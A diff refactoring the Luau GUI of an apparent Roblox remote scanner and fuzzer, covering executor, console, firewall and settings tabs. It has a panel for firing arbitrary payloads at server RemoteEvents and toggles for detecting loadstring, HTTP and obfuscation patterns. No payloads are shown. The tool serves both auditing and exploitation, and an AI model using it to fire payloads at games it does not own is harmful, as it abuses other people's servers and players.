+fzRSF.BackgroundColor3 = T.BG2
+fzRSF.BackgroundTransparency = 0
+mkCorner(fzRSF, 6)
+mkStroke(fzRSF, T.BDR)
+mkPad(fzRSF, 4, 4, 4, 4)
+FuzzResultList = Instance.new("Frame")
+FuzzResultList.Size = UDim2.new(1,0,0,0)
+FuzzResultList.BackgroundTransparency = 1
+FuzzResultList.Parent = fzRSF
+mkList(FuzzResultList, 3)
+
+-- G-Bridge panel
+local gbHdr = mkLbl(FZ, "G-BRIDGE / SHARED-TABLE FINDINGS", 10, T.TXM, Enum.Font.GothamBold)
+gbHdr.Size = UDim2.new(1,-16,0,14)
+gbHdr.Position = UDim2.new(0,8,1,-78)
+
+local gbSF = mkSF(FZ, UDim2.new(1,-16,0,60), UDim2.new(0,8,1,-62))
+gbSF.BackgroundColor3 = Color3.fromRGB(16,10,24)
+gbSF.BackgroundTransparency = 0
+mkCorner(gbSF, 6)
+mkStroke(gbSF, T.PRP, 1)
+mkPad(gbSF, 4, 4, 4, 4)
+GBridgeList = Instance.new("Frame")
+GBridgeList.Size = UDim2.new(1,0,0,0)
+GBridgeList.BackgroundTransparency = 1
+GBridgeList.Parent = gbSF
+mkList(GBridgeList, 2)
+
+-- ═══════════════════════════════════════════════════════════════════════
 -- §11  EXECUTOR TAB
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local EX=tabFrames["Executor"]
-local exLeft=Instance.new("Frame"); exLeft.Size=UDim2.new(0.57,-6,1,-16); exLeft.Position=UDim2.new(0,8,0,8); exLeft.BackgroundTransparency=1; exLeft.Parent=EX
-local exRight=Instance.new("Frame"); exRight.Size=UDim2.new(0.43,-10,1,-16); exRight.Position=UDim2.new(0.57,2,0,8); exRight.BackgroundTransparency=1; exRight.Parent=EX
+local EX = tabFrames["Executor"]
 
-lbl(exLeft,"TARGET REMOTE PATH",10,T.TXM,Enum.Font.GothamBold).Size=UDim2.new(1,0,0,14)
-TargetBox=Instance.new("TextBox"); TargetBox.Size=UDim2.new(1,0,0,28); TargetBox.Position=UDim2.new(0,0,0,17)
-TargetBox.BackgroundColor3=T.BG3; TargetBox.TextColor3=T.ACC; TargetBox.PlaceholderText="Select from Scanner / Fuzzer or type full path…"
-TargetBox.PlaceholderColor3=T.TXM; TargetBox.Font=Enum.Font.Code; TargetBox.TextSize=11; TargetBox.ClearTextOnFocus=false
-TargetBox.TextXAlignment=Enum.TextXAlignment.Left; TargetBox.Parent=exLeft; corner(TargetBox,6); stroke(TargetBox,T.BDR); pad(TargetBox,0,8,0,8)
+local exLeft = Instance.new("Frame")
+exLeft.Size = UDim2.new(0.56,-6,1,-16)
+exLeft.Position = UDim2.new(0,8,0,8)
+exLeft.BackgroundTransparency = 1
+exLeft.Parent = EX
 
-lbl(exLeft,"FIRE MODE",10,T.TXM,Enum.Font.GothamBold).Size=UDim2.new(1,0,0,14); local modl=exLeft:FindFirstChildOfClass("TextLabel"); if modl then modl.Position=UDim2.new(0,0,0,52) end
--- redo proper positioning
-local modePos=lbl(exLeft,"FIRE MODE",10,T.TXM,Enum.Font.GothamBold); modePos.Size=UDim2.new(1,0,0,14); modePos.Position=UDim2.new(0,0,0,52)
-local modeBar=Instance.new("Frame"); modeBar.Size=UDim2.new(1,0,0,28); modeBar.Position=UDim2.new(0,0,0,68); modeBar.BackgroundTransparency=1; modeBar.Parent=exLeft; ll(modeBar,6,Enum.FillDirection.Horizontal)
-local bFS=btn(modeBar,"FireServer",T.ACC,T.TXT,UDim2.new(0,108,1,0))
-local bIS=btn(modeBar,"InvokeServer",T.BG3,T.TXS,UDim2.new(0,115,1,0))
-bFS.MouseButton1Click:Connect(function() S.fireMode="FireServer"; bFS.BackgroundColor3=T.ACC; bFS.TextColor3=T.TXT; bIS.BackgroundColor3=T.BG3; bIS.TextColor3=T.TXS end)
-bIS.MouseButton1Click:Connect(function() S.fireMode="InvokeServer"; bIS.BackgroundColor3=T.ACC; bIS.TextColor3=T.TXT; bFS.BackgroundColor3=T.BG3; bFS.TextColor3=T.TXS end)
+local exRight = Instance.new("Frame")
+exRight.Size = UDim2.new(0.44,-10,1,-16)
+exRight.Position = UDim2.new(0.56,2,0,8)
+exRight.BackgroundTransparency = 1
+exRight.Parent = EX
 
-local payLbl=lbl(exLeft,"PAYLOAD",10,T.TXM,Enum.Font.GothamBold); payLbl.Size=UDim2.new(1,0,0,14); payLbl.Position=UDim2.new(0,0,0,104)
-PayloadBox=Instance.new("TextBox"); PayloadBox.Size=UDim2.new(1,0,0,145); PayloadBox.Position=UDim2.new(0,0,0,121)
-PayloadBox.BackgroundColor3=T.BG2; PayloadBox.TextColor3=T.TXT; PayloadBox.PlaceholderText="-- Enter payload code here\nprint('test')"
-PayloadBox.PlaceholderColor3=T.TXM; PayloadBox.Font=Enum.Font.Code; PayloadBox.TextSize=12; PayloadBox.ClearTextOnFocus=false
-PayloadBox.MultiLine=true; PayloadBox.TextXAlignment=Enum.TextXAlignment.Left; PayloadBox.TextYAlignment=Enum.TextYAlignment.Top
-PayloadBox.Parent=exLeft; corner(PayloadBox,6); stroke(PayloadBox,T.BDR); pad(PayloadBox,8,8,8,8)
+-- Target path
+local exTLbl = mkLbl(exLeft, "TARGET REMOTE PATH", 10, T.TXM, Enum.Font.GothamBold)
+exTLbl.Size = UDim2.new(1,0,0,14)
 
-local exBtns=Instance.new("Frame"); exBtns.Size=UDim2.new(1,0,0,30); exBtns.Position=UDim2.new(0,0,0,273); exBtns.BackgroundTransparency=1; exBtns.Parent=exLeft; ll(exBtns,6,Enum.FillDirection.Horizontal)
-local bExec   =btn(exBtns,"▶  Execute",  T.BGRN,T.TXT,UDim2.new(0,108,1,0))
-local bTest   =btn(exBtns,"🔔 Test Fire", T.BBLU,T.TXT,UDim2.new(0,108,1,0))
-local bClrPay =btn(exBtns,"🗑 Clear",    T.BG3, T.TXS,UDim2.new(0,78,1,0))
+TargetBox = Instance.new("TextBox")
+TargetBox.Size = UDim2.new(1,0,0,28)
+TargetBox.Position = UDim2.new(0,0,0,17)
+TargetBox.BackgroundColor3 = T.BG3
+TargetBox.TextColor3 = T.ACC
+TargetBox.PlaceholderText = "Select from Scanner tab, or type full instance path…"
+TargetBox.PlaceholderColor3 = T.TXM
+TargetBox.Font = Enum.Font.Code
+TargetBox.TextSize = 11
+TargetBox.ClearTextOnFocus = false
+TargetBox.TextXAlignment = Enum.TextXAlignment.Left
+TargetBox.Parent = exLeft
+mkCorner(TargetBox, 6)
+mkStroke(TargetBox, T.BDR)
+mkPad(TargetBox, 0, 8, 0, 8)
 
-ExecResultLabel=lbl(exLeft,"Last result: —",11,T.TXM,Enum.Font.Code); ExecResultLabel.Size=UDim2.new(1,0,0,13); ExecResultLabel.Position=UDim2.new(0,0,0,311)
+-- Fire mode
+local exMLbl = mkLbl(exLeft, "FIRE MODE", 10, T.TXM, Enum.Font.GothamBold)
+exMLbl.Size = UDim2.new(1,0,0,14)
+exMLbl.Position = UDim2.new(0,0,0,52)
 
-lbl(exLeft,"EXECUTION HISTORY",10,T.TXM,Enum.Font.GothamBold).Size=UDim2.new(1,0,0,14); local histLbl=exLeft:FindFirstChildOfClass("TextLabel")
-local hSF=sf(exLeft,UDim2.new(1,0,0,72),UDim2.new(0,0,0,342)); hSF.BackgroundColor3=T.BG2; hSF.BackgroundTransparency=0; corner(hSF,6); stroke(hSF,T.BDR)
-HistList=Instance.new("Frame"); HistList.Size=UDim2.new(1,0,0,0); HistList.BackgroundTransparency=1; HistList.Parent=hSF; ll(HistList,2); pad(HistList,4,4,4,4)
+local modeBar = Instance.new("Frame")
+modeBar.Size = UDim2.new(1,0,0,28)
+modeBar.Position = UDim2.new(0,0,0,68)
+modeBar.BackgroundTransparency = 1
+modeBar.Parent = exLeft
+mkList(modeBar, 6, Enum.FillDirection.Horizontal)
 
--- Library (right)
-lbl(exRight,"PAYLOAD LIBRARY",10,T.TXM,Enum.Font.GothamBold).Size=UDim2.new(1,0,0,14)
-local libSF=sf(exRight,UDim2.new(1,0,1,-22),UDim2.new(0,0,0,18)); libSF.BackgroundColor3=T.BG2; libSF.BackgroundTransparency=0; corner(libSF,6); stroke(libSF,T.BDR)
-local LibList=Instance.new("Frame"); LibList.Size=UDim2.new(1,0,0,0); LibList.BackgroundTransparency=1; LibList.Parent=libSF; ll(LibList,3); pad(LibList,4,4,4,4)
+local bFS = mkBtn(modeBar, "FireServer",   T.ACC, T.TXT, UDim2.new(0,108,1,0))
+local bIS = mkBtn(modeBar, "InvokeServer", T.BG3, T.TXS, UDim2.new(0,115,1,0))
 
--- ════════════════════════════════════════════════════════════════════════
+bFS.MouseButton1Click:Connect(function()
+    S.fireMode = "FireServer"
+    bFS.BackgroundColor3 = T.ACC;  bFS.TextColor3 = T.TXT
+    bIS.BackgroundColor3 = T.BG3;  bIS.TextColor3 = T.TXS
+end)
+bIS.MouseButton1Click:Connect(function()
+    S.fireMode = "InvokeServer"
+    bIS.BackgroundColor3 = T.ACC;  bIS.TextColor3 = T.TXT
+    bFS.BackgroundColor3 = T.BG3;  bFS.TextColor3 = T.TXS
+end)
+
+-- Payload box
+local exPLbl = mkLbl(exLeft, "PAYLOAD", 10, T.TXM, Enum.Font.GothamBold)
+exPLbl.Size = UDim2.new(1,0,0,14)
+exPLbl.Position = UDim2.new(0,0,0,103)
+
+PayloadBox = Instance.new("TextBox")
+PayloadBox.Size = UDim2.new(1,0,0,150)
+PayloadBox.Position = UDim2.new(0,0,0,120)
+PayloadBox.BackgroundColor3 = T.BG2
+PayloadBox.TextColor3 = T.TXT
+PayloadBox.PlaceholderText = "-- Enter payload code here\nprint('test')"
+PayloadBox.PlaceholderColor3 = T.TXM
+PayloadBox.Font = Enum.Font.Code
+PayloadBox.TextSize = 12
+PayloadBox.MultiLine = true
+PayloadBox.ClearTextOnFocus = false
+PayloadBox.TextXAlignment = Enum.TextXAlignment.Left
+PayloadBox.TextYAlignment = Enum.TextYAlignment.Top
+PayloadBox.Parent = exLeft
+mkCorner(PayloadBox, 6)
+mkStroke(PayloadBox, T.BDR)
+mkPad(PayloadBox, 8, 8, 8, 8)
+
+-- Execute buttons
+local execBtnBar = Instance.new("Frame")
+execBtnBar.Size = UDim2.new(1,0,0,30)
+execBtnBar.Position = UDim2.new(0,0,0,276)
+execBtnBar.BackgroundTransparency = 1
+execBtnBar.Parent = exLeft
+mkList(execBtnBar, 6, Enum.FillDirection.Horizontal)
+
+local bExec  = mkBtn(execBtnBar, "▶  Execute",  T.BGRN, T.TXT, UDim2.new(0,108,1,0))
+local bTestF = mkBtn(execBtnBar, "🔔 Test Fire", T.BBLU, T.TXT, UDim2.new(0,108,1,0))
+local bClrP  = mkBtn(execBtnBar, "🗑 Clear",     T.BG3,  T.TXS, UDim2.new(0,75,1,0))
+
+ExecResultLabel = mkLbl(exLeft, "Last result: —", 11, T.TXM, Enum.Font.Code)
+ExecResultLabel.Size = UDim2.new(1,0,0,14)
+ExecResultLabel.Position = UDim2.new(0,0,0,314)
+
+local histHdr = mkLbl(exLeft, "EXECUTION HISTORY", 10, T.TXM, Enum.Font.GothamBold)
+histHdr.Size = UDim2.new(1,0,0,14)
+histHdr.Position = UDim2.new(0,0,0,333)
+
+local hSF = mkSF(exLeft, UDim2.new(1,0,0,78), UDim2.new(0,0,0,350))
+hSF.BackgroundColor3 = T.BG2
+hSF.BackgroundTransparency = 0
+mkCorner(hSF, 6)
+mkStroke(hSF, T.BDR)
+HistList = Instance.new("Frame")
+HistList.Size = UDim2.new(1,0,0,0)
+HistList.BackgroundTransparency = 1
+HistList.Parent = hSF
+mkList(HistList, 2)
+mkPad(HistList, 4, 4, 4, 4)
+
+-- Payload library (right column)
+local libHdr = mkLbl(exRight, "PAYLOAD LIBRARY", 10, T.TXM, Enum.Font.GothamBold)
+libHdr.Size = UDim2.new(1,0,0,14)
+
+local libSF = mkSF(exRight, UDim2.new(1,0,1,-20), UDim2.new(0,0,0,18))
+libSF.BackgroundColor3 = T.BG2
+libSF.BackgroundTransparency = 0
+mkCorner(libSF, 6)
+mkStroke(libSF, T.BDR)
+
+local LibList = Instance.new("Frame")
+LibList.Size = UDim2.new(1,0,0,0)
+LibList.BackgroundTransparency = 1
+LibList.Parent = libSF
+mkList(LibList, 3)
+mkPad(LibList, 4, 4, 4, 4)
+
+-- ═══════════════════════════════════════════════════════════════════════
 -- §12  CONSOLE TAB
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local CON=tabFrames["Console"]
-local conBar=Instance.new("Frame"); conBar.Size=UDim2.new(1,-16,0,28); conBar.Position=UDim2.new(0,8,0,8); conBar.BackgroundTransparency=1; conBar.Parent=CON; ll(conBar,6,Enum.FillDirection.Horizontal)
-local bConClr=btn(conBar,"🗑 Clear",T.BG3,T.TXS,UDim2.new(0,80,1,0))
-lbl(conBar,"Filter:",11,T.TXM,Enum.Font.Gotham).Size=UDim2.new(0,40,1,0)
-local fAll =btn(conBar,"ALL", T.ACC,   T.TXT, UDim2.new(0,44,1,0))
-local fCrit=btn(conBar,"CRIT",T.BG3,   T.CRIT,UDim2.new(0,44,1,0))
-local fWarn=btn(conBar,"WARN",T.BG3,   T.WARN,UDim2.new(0,44,1,0))
-local fFuzz=btn(conBar,"FUZZ",T.BG3,   T.PRP, UDim2.new(0,44,1,0))
+local CON = tabFrames["Console"]
 
-local conSF=sf(CON,UDim2.new(1,-16,1,-50),UDim2.new(0,8,0,42)); conSF.BackgroundColor3=T.BG2; conSF.BackgroundTransparency=0; corner(conSF,6); stroke(conSF,T.BDR); pad(conSF,4,4,4,4)
-ConsoleList=Instance.new("Frame"); ConsoleList.Size=UDim2.new(1,0,0,0); ConsoleList.BackgroundTransparency=1; ConsoleList.Parent=conSF; ll(ConsoleList,1)
-bConClr.MouseButton1Click:Connect(function() ConsoleList:ClearAllChildren(); ll(ConsoleList,1); log("SYS","Console cleared.") end)
+local conCtrl = Instance.new("Frame")
+conCtrl.Size = UDim2.new(1,-16,0,28)
+conCtrl.Position = UDim2.new(0,8,0,8)
+conCtrl.BackgroundTransparency = 1
+conCtrl.Parent = CON
+mkList(conCtrl, 6, Enum.FillDirection.Horizontal)
 
--- ════════════════════════════════════════════════════════════════════════
+local bConClr = mkBtn(conCtrl, "🗑 Clear", T.BG3, T.TXS, UDim2.new(0,80,1,0))
+local conSF = mkSF(CON, UDim2.new(1,-16,1,-48), UDim2.new(0,8,0,40))
+conSF.BackgroundColor3 = T.BG2
+conSF.BackgroundTransparency = 0
+mkCorner(conSF, 6)
+mkStroke(conSF, T.BDR)
+mkPad(conSF, 4, 4, 4, 4)
+
+ConsoleList = Instance.new("Frame")
+ConsoleList.Size = UDim2.new(1,0,0,0)
+ConsoleList.BackgroundTransparency = 1
+ConsoleList.Parent = conSF
+mkList(ConsoleList, 1)
+
+bConClr.MouseButton1Click:Connect(function()
+    ConsoleList:ClearAllChildren()
+    mkList(ConsoleList, 1)
+    log("SYS", "Console cleared.")
+end)
+
+-- ═══════════════════════════════════════════════════════════════════════
 -- §13  FIREWALL TAB
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local FWT=tabFrames["Firewall"]
+local FWT = tabFrames["Firewall"]
 
-local function fwInfoBox(parent, labelText, yPos, initState, onChange)
-    local box=Instance.new("Frame"); box.Size=UDim2.new(1,-16,0,38); box.Position=UDim2.new(0,8,0,yPos); box.BackgroundColor3=T.BG2; box.BorderSizePixel=0; box.Parent=parent; corner(box,8); stroke(box,T.BDR); pad(box,0,12,0,12)
-    local l=lbl(box,labelText,12,T.TXM,Enum.Font.Gotham); l.Size=UDim2.new(1,-58,1,0)
-    toggle(box,"",initState,onChange).Size=UDim2.new(0,50,1,0)
-    return box
+local fwBar1 = Instance.new("Frame")
+fwBar1.Size = UDim2.new(1,-16,0,36)
+fwBar1.Position = UDim2.new(0,8,0,8)
+fwBar1.BackgroundColor3 = T.BG2
+fwBar1.BorderSizePixel = 0
+fwBar1.Parent = FWT
+mkCorner(fwBar1, 8)
+mkStroke(fwBar1, T.BDR)
+mkPad(fwBar1, 0,12,0,12)
+
+local fwM1 = mkLbl(fwBar1, "AUTO FIREWALL MODE  —  neutralise suspicious remotes on scan", 12, T.TXM, Enum.Font.Gotham)
+fwM1.Size = UDim2.new(1,-58,1,0)
+local fwT1 = mkToggle(fwBar1, "", CFG.FIREWALL_MODE, function(v) CFG.FIREWALL_MODE=v; log("SYS","Firewall mode "..(v and "ON" or "OFF")) end)
+fwT1.Size = UDim2.new(0,50,1,0)
+fwT1.Position = UDim2.new(1,-50,0,0)
+
+local fwBar2 = Instance.new("Frame")
+fwBar2.Size = UDim2.new(1,-16,0,36)
+fwBar2.Position = UDim2.new(0,8,0,52)
+fwBar2.BackgroundColor3 = T.BG2
+fwBar2.BorderSizePixel = 0
+fwBar2.Parent = FWT
+mkCorner(fwBar2, 8)
+mkStroke(fwBar2, T.BDR)
+mkPad(fwBar2, 0,12,0,12)
+
+local fwM2 = mkLbl(fwBar2, "LIVE MONITOR  —  DescendantAdded watchers on all services", 12, T.TXM, Enum.Font.Gotham)
+fwM2.Size = UDim2.new(1,-58,1,0)
+local fwT2 = mkToggle(fwBar2, "", CFG.LIVE_MONITOR, function(v) CFG.LIVE_MONITOR=v; log("SYS","Live monitor "..(v and "ON" or "OFF")) end)
+fwT2.Size = UDim2.new(0,50,1,0)
+fwT2.Position = UDim2.new(1,-50,0,0)
+
+local fwBtnRow = Instance.new("Frame")
+fwBtnRow.Size = UDim2.new(1,-16,0,30)
+fwBtnRow.Position = UDim2.new(0,8,0,96)
+fwBtnRow.BackgroundTransparency = 1
+fwBtnRow.Parent = FWT
+mkList(fwBtnRow, 6, Enum.FillDirection.Horizontal)
+
+local bFWAS  = mkBtn(fwBtnRow, "🛡 Firewall All Suspicious", T.BRED, T.TXT, UDim2.new(0,200,1,0))
+local bFWClr = mkBtn(fwBtnRow, "🗑 Clear Log",               T.BG3,  T.TXS, UDim2.new(0,95,1,0))
+
+local fwHdr = Instance.new("Frame")
+fwHdr.Size = UDim2.new(1,-16,0,20)
+fwHdr.Position = UDim2.new(0,8,0,134)
+fwHdr.BackgroundColor3 = T.BG3
+fwHdr.BorderSizePixel = 0
+fwHdr.Parent = FWT
+mkCorner(fwHdr, 4)
+local function fwH(t,w,x) local h=mkLbl(fwHdr,t,9,T.TXM,Enum.Font.GothamBold); h.Size=UDim2.new(0,w,1,0); h.Position=UDim2.new(0,x,0,0) end
+fwH("CLASS",120,8); fwH("PATH",360,132); fwH("TIME",90,506)
+
+local fwSF = mkSF(FWT, UDim2.new(1,-16,1,-164), UDim2.new(0,8,0,158))
+fwSF.BackgroundColor3 = T.BG2
+fwSF.BackgroundTransparency = 0
+mkCorner(fwSF, 6)
+mkStroke(fwSF, T.BDR)
+mkPad(fwSF, 4,4,4,4)
+FWList = Instance.new("Frame")
+FWList.Size = UDim2.new(1,0,0,0)
+FWList.BackgroundTransparency = 1
+FWList.Parent = fwSF
+mkList(FWList, 3)
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- §14  SETTINGS TAB
+-- ═══════════════════════════════════════════════════════════════════════
+
+local SET = tabFrames["Settings"]
+local setSF = mkSF(SET, UDim2.new(1,-16,1,-16), UDim2.new(0,8,0,8))
+setSF.BackgroundTransparency = 1
+
+local setList = Instance.new("Frame")
+setList.Size = UDim2.new(1,0,0,0)
+setList.BackgroundTransparency = 1
+setList.Parent = setSF
+mkList(setList, 8)
+mkPad(setList, 4,4,4,4)
+
+local function setHdr(t)
+    local l = mkLbl(setList, t, 10, T.TXM, Enum.Font.GothamBold)
+    l.Size = UDim2.new(1,0,0,16)
+    mkSep(setList)
 end
 
-fwInfoBox(FWT,"AUTO FIREWALL MODE  —  neutralise suspicious remotes immediately on scan",8,CFG.FIREWALL_MODE,function(v) CFG.FIREWALL_MODE=v; log("SYS","Firewall mode "..(v and "ON" or "OFF")) end)
-fwInfoBox(FWT,"LIVE MONITOR  —  DescendantAdded watchers on all 12 services",54,CFG.LIVE_MONITOR,function(v) CFG.LIVE_MONITOR=v; log("SYS","Live monitor "..(v and "ON" or "OFF")) end)
-
-local fwBB=Instance.new("Frame"); fwBB.Size=UDim2.new(1,-16,0,30); fwBB.Position=UDim2.new(0,8,0,100); fwBB.BackgroundTransparency=1; fwBB.Parent=FWT; ll(fwBB,6,Enum.FillDirection.Horizontal)
-local bFWAS =btn(fwBB,"🛡 Firewall All Suspicious",T.BRED,T.TXT,UDim2.new(0,200,1,0))
-local bFWRes=btn(fwBB,"↩ Restore Note",           T.BORA,T.TXT,UDim2.new(0,120,1,0))
-local bFWClr=btn(fwBB,"🗑 Clear Log",              T.BG3, T.TXS,UDim2.new(0,95,1,0))
-
-local fwHdr=Instance.new("Frame"); fwHdr.Size=UDim2.new(1,-16,0,22); fwHdr.Position=UDim2.new(0,8,0,138); fwHdr.BackgroundColor3=T.BG3; fwHdr.BorderSizePixel=0; fwHdr.Parent=FWT; corner(fwHdr,4)
-local function fwH(t,w,x) local l=lbl(fwHdr,t,9,T.TXM,Enum.Font.GothamBold); l.Size=UDim2.new(0,w,1,0); l.Position=UDim2.new(0,x,0,0) end
-fwH("CLASS",115,8); fwH("PATH",355,126); fwH("FIREWALLED AT",90,490)
-
-local fwSF=sf(FWT,UDim2.new(1,-16,1,-170),UDim2.new(0,8,0,165)); fwSF.BackgroundColor3=T.BG2; fwSF.BackgroundTransparency=0; corner(fwSF,6); stroke(fwSF,T.BDR); pad(fwSF,4,4,4,4)
-FWList=Instance.new("Frame"); FWList.Size=UDim2.new(1,0,0,0); FWList.BackgroundTransparency=1; FWList.Parent=fwSF; ll(FWList,3)
-
--- ════════════════════════════════════════════════════════════════════════
--- §14  SETTINGS TAB
--- ════════════════════════════════════════════════════════════════════════
-
-local SET=tabFrames["Settings"]
-local setSF=sf(SET,UDim2.new(1,-16,1,-16),UDim2.new(0,8,0,8)); setSF.BackgroundTransparency=1
-local setList=Instance.new("Frame"); setList.Size=UDim2.new(1,0,0,0); setList.BackgroundTransparency=1; setList.Parent=setSF; ll(setList,8); pad(setList,4,4,4,4)
-
-local function setHdr(t) local l=lbl(setList,t,10,T.TXM,Enum.Font.GothamBold); l.Size=UDim2.new(1,0,0,16); sep(setList) end
 local function setGrp(builder)
-    local b=Instance.new("Frame"); b.Size=UDim2.new(1,0,0,0); b.AutomaticSize=Enum.AutomaticSize.Y
-    b.BackgroundColor3=T.BG2; b.BorderSizePixel=0; b.Parent=setList; corner(b,8); stroke(b,T.BDR); pad(b,8,12,8,12); ll(b,8); builder(b)
+    local box = Instance.new("Frame")
+    box.Size = UDim2.new(1,0,0,0)
+    box.AutomaticSize = Enum.AutomaticSize.Y
+    box.BackgroundColor3 = T.BG2
+    box.BorderSizePixel = 0
+    box.Parent = setList
+    mkCorner(box, 8)
+    mkStroke(box, T.BDR)
+    mkPad(box, 8,12,8,12)
+    mkList(box, 8)
+    builder(box)
 end
 
 setHdr("DEEP SCAN OPTIONS")
 setGrp(function(p)
-    toggle(p,"Verbose — show all remotes, not only suspicious",         CFG.VERBOSE,        function(v) CFG.VERBOSE=v end)
-    toggle(p,"Scan Script Sources (loadstring / HTTP / obfuscation)",   CFG.SCAN_SCRIPTS,   function(v) CFG.SCAN_SCRIPTS=v end)
-    toggle(p,"Scan Instance Attributes (hidden AssetIDs / URLs)",       CFG.SCAN_ATTRS,     function(v) CFG.SCAN_ATTRS=v end)
-    toggle(p,"Scan StringValue objects (hidden IDs)",                   CFG.SCAN_STRVALS,   function(v) CFG.SCAN_STRVALS=v end)
-    toggle(p,"Obfuscation Detection (entropy / long lines)",            CFG.SCAN_OBFUSCATION,function(v) CFG.SCAN_OBFUSCATION=v end)
-    toggle(p,"G-Bridge Probe (_G / shared / getgenv scan)",             CFG.SCAN_GBRIDGE,   function(v) CFG.SCAN_GBRIDGE=v end)
-    toggle(p,"Live Monitor (DescendantAdded on all services)",          CFG.LIVE_MONITOR,   function(v) CFG.LIVE_MONITOR=v end)
-    toggle(p,"Auto Firewall Mode",                                      CFG.FIREWALL_MODE,  function(v) CFG.FIREWALL_MODE=v end)
+    mkToggle(p,"Verbose — show all remotes, not only suspicious",        CFG.VERBOSE,       function(v) CFG.VERBOSE=v end)
+    mkToggle(p,"Scan Script Sources (loadstring/HTTP/obfuscation)",       CFG.SCAN_SCRIPTS,  function(v) CFG.SCAN_SCRIPTS=v end)
+    mkToggle(p,"Scan Instance Attributes (hidden AssetIDs/URLs)",         CFG.SCAN_ATTRS,    function(v) CFG.SCAN_ATTRS=v end)
+    mkToggle(p,"Scan StringValue objects (hidden IDs)",                   CFG.SCAN_STRVALS,  function(v) CFG.SCAN_STRVALS=v end)
+    mkToggle(p,"Obfuscation Detection (entropy / long lines)",            CFG.SCAN_OBFUSCATE,function(v) CFG.SCAN_OBFUSCATE=v end)
+    mkToggle(p,"G-Bridge Probe (_G / shared / getgenv)",                  CFG.SCAN_GBRIDGE,  function(v) CFG.SCAN_GBRIDGE=v end)
+    mkToggle(p,"Live Monitor (DescendantAdded on all services)",           CFG.LIVE_MONITOR,  function(v) CFG.LIVE_MONITOR=v end)
+    mkToggle(p,"Auto Firewall Mode",                                       CFG.FIREWALL_MODE, function(v) CFG.FIREWALL_MODE=v end)
 end)
 
 setHdr("EXECUTOR SETTINGS")
 setGrp(function(p)
     local function numRow(labelTxt, key, lo, hi)
-        local row=Instance.new("Frame"); row.Size=UDim2.new(1,0,0,28); row.BackgroundTransparency=1; row.Parent=p
-        local l=lbl(row,labelTxt,13,T.TXT,Enum.Font.Gotham); l.Size=UDim2.new(1,-72,1,0)
-        local tb=Instance.new("TextBox"); tb.Size=UDim2.new(0,62,0,24); tb.Position=UDim2.new(1,-62,0.5,-12); tb.BackgroundColor3=T.BG3; tb.TextColor3=T.ACC; tb.Font=Enum.Font.Code; tb.TextSize=13; tb.Text=tostring(CFG[key]); tb.Parent=row; corner(tb,4); stroke(tb,T.BDR)
-        tb.FocusLost:Connect(function() local n=tonumber(tb.Text); if n and n>=lo and n<=hi then CFG[key]=n; log("SYS",key.."="..n) else tb.Text=tostring(CFG[key]) end end)
+        local row = Instance.new("Frame"); row.Size=UDim2.new(1,0,0,28); row.BackgroundTransparency=1; row.Parent=p
+        local nl = mkLbl(row, labelTxt, 13, T.TXT, Enum.Font.Gotham); nl.Size=UDim2.new(1,-72,1,0)
+        local tb = Instance.new("TextBox"); tb.Size=UDim2.new(0,62,0,24); tb.Position=UDim2.new(1,-62,0.5,-12)
+        tb.BackgroundColor3=T.BG3; tb.TextColor3=T.ACC; tb.Font=Enum.Font.Code; tb.TextSize=13; tb.Text=tostring(CFG[key]); tb.Parent=row
+        mkCorner(tb,4); mkStroke(tb,T.BDR)
+        tb.FocusLost:Connect(function()
+            local n = tonumber(tb.Text)
+            if n and n>=lo and n<=hi then CFG[key]=n; log("SYS",key.."="..n)
+            else tb.Text=tostring(CFG[key]) end
+        end)
     end
-    numRow("InvokeServer Timeout (s)",   "INVOKE_TIMEOUT",   1, 60)
-    numRow("Max History Entries",        "MAX_EXEC_HISTORY", 1, 100)
-    numRow("Obfuscation Line Threshold", "ENTROPY_LINE_LEN", 100, 2000)
+    numRow("InvokeServer Timeout (s)",   "INVOKE_TIMEOUT", 1, 60)
+    numRow("Max History Entries",        "MAX_EXEC_HIST",  1, 100)
+    numRow("Obfuscation Line Threshold", "ENTROPY_LINE",   80, 2000)
 end)
 
 setHdr("SUSPICIOUS KEYWORDS  (comma-separated)")
 setGrp(function(p)
-    local note=lbl(p,"Remote names containing any keyword are flagged.",12,T.TXM,Enum.Font.Gotham); note.Size=UDim2.new(1,0,0,15)
-    local kwTB=Instance.new("TextBox"); kwTB.Size=UDim2.new(1,0,0,72); kwTB.BackgroundColor3=T.BG3; kwTB.TextColor3=T.TXT; kwTB.Font=Enum.Font.Code; kwTB.TextSize=11; kwTB.MultiLine=true; kwTB.ClearTextOnFocus=false; kwTB.TextXAlignment=Enum.TextXAlignment.Left; kwTB.TextYAlignment=Enum.TextYAlignment.Top; kwTB.Text=table.concat(CFG.BAD_NAMES,", "); kwTB.Parent=p; corner(kwTB,4); stroke(kwTB,T.BDR); pad(kwTB,4,4,4,4)
-    kwTB.FocusLost:Connect(function() local w={}; for s in kwTB.Text:gmatch("[^,%s]+") do w[#w+1]=s:lower() end; CFG.BAD_NAMES=w; log("SYS","Keywords updated: "..#w.." entries") end)
+    local nl = mkLbl(p, "Remote names containing any keyword are flagged.", 12, T.TXM, Enum.Font.Gotham)
+    nl.Size = UDim2.new(1,0,0,15)
+    local kwBox = Instance.new("TextBox"); kwBox.Size=UDim2.new(1,0,0,72); kwBox.BackgroundColor3=T.BG3; kwBox.TextColor3=T.TXT
+    kwBox.Font=Enum.Font.Code; kwBox.TextSize=11; kwBox.MultiLine=true; kwBox.ClearTextOnFocus=false
+    kwBox.TextXAlignment=Enum.TextXAlignment.Left; kwBox.TextYAlignment=Enum.TextYAlignment.Top
+    kwBox.Text=table.concat(CFG.BAD_NAMES,", "); kwBox.Parent=p; mkCorner(kwBox,4); mkStroke(kwBox,T.BDR); mkPad(kwBox,4,4,4,4)
+    kwBox.FocusLost:Connect(function()
+        local words={}; for w in kwBox.Text:gmatch("[^,%s]+") do words[#words+1]=w:lower() end
+        CFG.BAD_NAMES=words; log("SYS","Keywords updated: "..#words.." entries")
+    end)
 end)
 
-local bReset=btn(setList,"↺  Reset All Settings to Defaults",T.BORA,T.TXT,UDim2.new(1,0,0,34))
